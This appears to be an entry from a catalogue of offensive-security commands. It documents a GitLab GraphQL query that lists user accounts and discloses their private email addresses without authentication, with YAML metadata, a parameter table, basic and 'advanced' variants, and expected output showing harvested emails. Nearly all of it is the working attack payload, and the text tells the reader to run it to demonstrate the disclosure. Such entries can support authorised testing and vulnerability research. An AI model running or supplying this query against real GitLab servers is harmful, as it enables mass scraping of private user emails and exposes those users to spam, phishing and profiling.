---
data: >-
  { users { edges { node { username email avatarUrl status { emoji message
  messageHtml } } } } }
tags:
  - graphql
  - query
  - disclosure
type: command
output: JSON response with user data including emails
executor: graphql
platforms:
  - Web
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:53.080Z'
id: 37fd24ab-6227-4e68-b24d-2cef63a69313
verified: false
validated: true
submitted: true
---
# gitlab-users-graphql-query

## Command

```graphql
{ users { edges { node { username email avatarUrl status { emoji message messageHtml } } } } }
```

## Description

This GraphQL query fetches a paginated list of GitLab users, disclosing private email addresses along with public fields like username and avatar. Use it in the GitLab GraphQL Explorer to demonstrate information disclosure without authentication.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| users | Root field to query user list | Yes |
| edges | Pagination wrapper for results | Yes |
| node | Individual user object within edge | Yes |
| username | Public username string | No (but returned) |
| email | Private email address | No (but disclosed) |
| avatarUrl | URL to user avatar image | No |
| status | User status object | No |
| emoji | Status emoji | No |
| message | Plain text status message | No |
| messageHtml | HTML-formatted status message | No |

## Examples

### Basic Usage

```graphql
{ users { edges { node { username email avatarUrl status { emoji message messageHtml } } } } }
```

### Advanced Usage

Add filters if supported (though not in vulnerable version):

```graphql
{ users(first: 10) { edges { node { username email } } } }
```

## Expected Output

JSON object like: {"data":{"users":{"edges":[{"node":{"username":"user1","email":"private@email.com","avatarUrl":"https://assets...","status":{"emoji":"","message":"","messageHtml":""}}}]}}} . Success includes populated 'email' fields for multiple users.

## Related

- [[Related Procedure: Execute-GitLab-Users-GraphQL-Query]]
